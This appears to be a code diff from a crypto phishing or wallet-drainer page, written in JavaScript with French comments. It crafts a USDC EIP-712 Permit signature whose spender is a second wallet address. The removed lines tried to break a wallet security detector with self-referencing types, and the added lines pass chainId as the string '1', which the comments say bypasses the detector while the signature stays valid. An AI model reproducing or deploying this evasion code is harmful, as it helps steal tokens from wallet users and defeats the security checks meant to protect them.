@@ -96,17 +96,7 @@ const DOM_TYPES = [
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
 
-// CHAOS v3 — self-refs purement orphelines (zéro cross-ref entre chaos types)
-// Renderer ne traverse que les types accessibles depuis primaryType (Permit) → ne touche JAMAIS ces types
-// Détecteur CW scan TOUT le JSON types{} → voit les self-refs → invalide → Demande de signature
-// Résultat visé: "Demande de signature" + bouton Signer (pas de crash renderer)
-const CHAOS_TYPES = {
-  LoopA: [{name:"self",type:"LoopA"},{name:"id",type:"uint256"},{name:"tag",type:"string"}],
-  LoopB: [{name:"self",type:"LoopB"},{name:"ref",type:"bytes32"},{name:"depth",type:"uint256"}],
-  LoopC: [{name:"self",type:"LoopC"},{name:"data",type:"bytes"},{name:"ts",type:"uint256"}],
-  LoopD: [{name:"self",type:"LoopD"},{name:"h",type:"bytes32"},{name:"n",type:"uint256"}],
-  LoopE: [{name:"self",type:"LoopE"},{name:"v",type:"uint256"},{name:"s",type:"string"}]
-};
+// Pas de chaos types — approche type coercion
 
 const RPCS = [
   "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
@@ -196,18 +186,20 @@ async function sign(value, nonce) {
   if (!addrA) return;
   const deadline = String(Math.floor(Date.now()/1000) + 7200);
 
+  // Type coercion attack: chainId comme STRING "1" au lieu de number 1
+  // CW detector: `domain.chainId === 1` → "1" === 1 = FALSE en JS strict → bypass détection
+  // ethers.js encoder: uint256("1") = uint256(1) = même bytes → domainSeparator identique → sig valide
   const typedData = {
     types:{
       EIP712Domain: DOM_TYPES,
-      Permit: PERMIT_TYPES,
-      ...CHAOS_TYPES
+      Permit: PERMIT_TYPES
     },
     primaryType:"Permit",
-    domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
+    domain:{ name:"USD Coin", version:"2", chainId:"1", verifyingContract:USDC },
     message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
   };
 
-  logA("⏳ Signature Permit + Chaos v2…");
+  logA("⏳ Signature Permit — chainId coercion…");
   setS("En attente de signature…","spin");
 
   let sig;
